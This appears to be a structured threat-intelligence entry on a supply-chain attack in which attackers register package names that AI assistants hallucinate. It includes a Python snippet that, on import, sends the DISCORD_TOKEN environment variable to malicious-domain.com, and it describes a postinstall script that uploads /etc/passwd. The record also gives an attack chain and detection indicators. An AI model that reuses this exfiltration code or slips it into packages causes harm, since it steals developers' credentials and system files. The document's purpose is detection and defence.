package_info.package_name: N/A (AI Hallucination Supply Chain Attack Pattern)
package_info.package_versions: N/A (applies to newly published, attacker-created versions)
package_info.why_malicious: Attackers exploit AI-generated package recommendations (hallucinations) by creating and publishing malicious packages with those names, anticipating that developers will trust and install them based on AI suggestions. This introduces malicious code into the software supply chain by leveraging trust in AI outputs and the rapid adoption of suggested dependencies.

malicious_snippets.code_snippet:
import os
import requests

def exfiltrate():
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        requests.post('https://malicious-domain.com/exfil', data={'token': token})
exfiltrate()
malicious_snippets.code_behavior: At import-time, the code accesses the DISCORD_TOKEN environment variable, sends its value to a hardcoded external domain via HTTPS POST, resulting in credential exfiltration.

malice_analysis.why_suspicious: The code programmatically accesses a sensitive environment variable (DISCORD_TOKEN) and transmits its value to an external, attacker-controlled server without user knowledge or consent.
malice_analysis.violated_expectations: Legitimate packages should not access or transmit environment variables unrelated to their documented functionality, especially not credentials, and should never exfiltrate such data to untrusted domains.
malice_analysis.similar_legitimate_use: Telemetry or crash reporting (with explicit user consent and clear documentation of what data is collected and where it is sent).
key_indicators: Access to sensitive environment variables (e.g., DISCORD_TOKEN)
Hardcoded external domain for data exfiltration (https://malicious-domain.com/exfil)
Network requests initiated during import-time execution
Lack of user notification or consent for data transmission

malicious_snippets.code_behavior: During postinstall, the code reads the /etc/passwd file and uploads its contents to a hardcoded remote server via HTTP POST, resulting in sensitive file exfiltration.

malice_analysis.why_suspicious: The postinstall script is configured to read a sensitive system file (/etc/passwd) and transmit its contents to an external, attacker-controlled server, which is not a legitimate installation activity.
malice_analysis.violated_expectations: Postinstall scripts should only perform setup tasks necessary for the package's operation and must not access or transmit unrelated system files, especially sensitive ones, to external destinations.
malice_analysis.similar_legitimate_use: Automated error reporting (with user consent and redacted, non-sensitive data), or legitimate telemetry that never includes sensitive system files.
key_indicators: Access to system files (e.g., /etc/passwd) in install scripts
Network exfiltration of file contents during postinstall phase
Use of shell commands (curl) to transmit data externally

attack_chain.action: Attacker identifies an AI hallucination (nonexistent package recommendation) from ChatGPT or similar AI assistant.
attack_chain.leads_to: Attacker creates and publishes a malicious package with the hallucinated name.

attack_chain.action: Attacker publishes a malicious package to the public registry (npm, PyPI, etc.) using the hallucinated package name.
attack_chain.leads_to: Developer installs the malicious package based on AI recommendation.

attack_chain.action: Developer installs or imports the malicious package in their project, trusting the AI-generated recommendation.
attack_chain.leads_to: Malicious code executes, exfiltrating sensitive data from the developer's environment.

attack_chain.action: Malicious code executes at import-time or postinstall, exfiltrating credentials or files to attacker-controlled infrastructure.
attack_chain.leads_to: Attacker receives exfiltrated data, compromising the developer or organization.

behavioral_signatures: Import-time or postinstall network requests to untrusted or hardcoded external domains
Access to sensitive environment variables (e.g., DISCORD_TOKEN) or system files (e.g., /etc/passwd) in install/import scripts
Packages with names matching recent AI hallucination recommendations that were not previously present in the registry
file_indicators: setup.py or main module containing code that accesses environment variables and performs network requests
package.json scripts (e.g., postinstall) invoking shell commands to read and transmit sensitive files
References to sensitive files such as /etc/passwd or environment variables in installation or import-time code
network_indicators: Outbound HTTP/HTTPS requests to domains not associated with the legitimate package author or project (e.g., https://malicious-domain.com/exfil, https://malicious-domain.com/upload)
POST requests containing environment variable values or file contents during installation or import
detection_knowledge.how_to_detect: Monitor for newly published packages with names that have recently appeared in AI-generated code recommendations but were not previously present in the registry. Analyze install and import scripts for code that accesses sensitive environment variables or system files and initiates network requests to untrusted domains. Flag packages that transmit sensitive data (such as credentials or system files) to hardcoded external endpoints during installation or import-time execution.
